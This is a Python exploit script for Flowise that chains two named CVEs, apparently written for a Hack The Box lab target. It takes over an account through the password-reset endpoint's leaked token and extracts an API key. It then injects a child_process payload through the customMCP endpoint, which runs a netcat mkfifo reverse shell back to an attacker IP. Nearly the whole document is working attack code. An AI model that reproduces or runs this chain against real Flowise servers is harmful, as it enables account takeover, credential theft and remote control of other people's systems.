# Flowise CVE-2025-58434 + CVE-2025-59528 exploit script - password reset + API key extraction + RCE via customMCP

import requests
def get_reset_token(target, email, session):
    url = f"{target}/api/v1/account/forgot-password"
    data = {"user": {"email": email}}

    res = session.post(url, json=data, timeout=10)

    if res.status_code != 201:
        print(f"Failed to request password reset for {email}")
        return None

    user = res.json().get("user", {})
    token = user.get("tempToken")
    return token

def reset_password(target, email, token, new_password, session):
    url = f"{target}/api/v1/account/reset-password"
    data = {"user":{"email":email,"tempToken":token,"password":new_password}}
    res = session.post(url, json=data, timeout=10)
    if res.status_code != 201:
        print(f"Failed to reset password with token {token}")
        return False
    return True

def extact_api_key(target, email, password, session):
    url = f"{target}/api/v1/auth/login"
    data = {"email":email,"password":password}
    res = session.post(url, json=data, timeout=10)
    if res.status_code != 200:
        print(f"Failed to login with {email}:{password}")
        return None

    url = f"{target}/api/v1/apikey"
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": target,
        "Referer": f"{target}/apikey",
        "x-request-from": "internal"
    }
    res = requests.get(url, cookies=session.cookies.get_dict(),headers=headers, timeout=10)
    print("[DEBUG] /apikey response:", res.text)
    api_key = res.json()[0].get("apiKey")
    if not api_key:
        print("Failed to extract API key")
        return None
    return api_key

def build_reverse_shell(lhost, lport):
    return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"

def trigger_rce(target, api_key, payload, session):
    url = f"{target}/api/v1/node-load-method/customMCP"
    headers = {"Content-Type": "application/json", "Authorization": f"Bearer {api_key}"}
    payload = payload.replace("\\", "\\\\").replace('"', '\\"')
    mcp_payload = f'({{x:(function(){{const cp = process.mainModule.require("child_process");cp.execSync("{payload}");return 1;}})()}})'
    data = {"loadMethod": "listActions","inputs": {"mcpServerConfig": mcp_payload}}
    
    try:
        res = session.post(url, json=data, headers=headers, timeout=10)
        return res.status_code, res.text
    except Exception as e:
        print(f"Error triggering RCE: {e}")
        return  None

def main():
    target = "http://staging.silentium.htb"
    email = "ben@silentium.htb"
    new_password = "NewP@ssw0rd!"
    lhost = "10.10.14.31"
    lport = "4444"
    session = requests.Session()
    session.verify = False

    token = get_reset_token(target, email, session)
    if not token:
        print("[-] No token")
        return

    if not reset_password(target, email, token, new_password, session):
        print("[-] Reset password failed")
        return
    payload = build_reverse_shell(lhost, lport)
    api_key = extact_api_key(target, email, new_password, session)
    if not api_key:
        print("[-] No API key")
        return
    status, resp = trigger_rce(target, api_key, payload, session)
    print("[Done script]")

if __name__ == "__main__":
    main()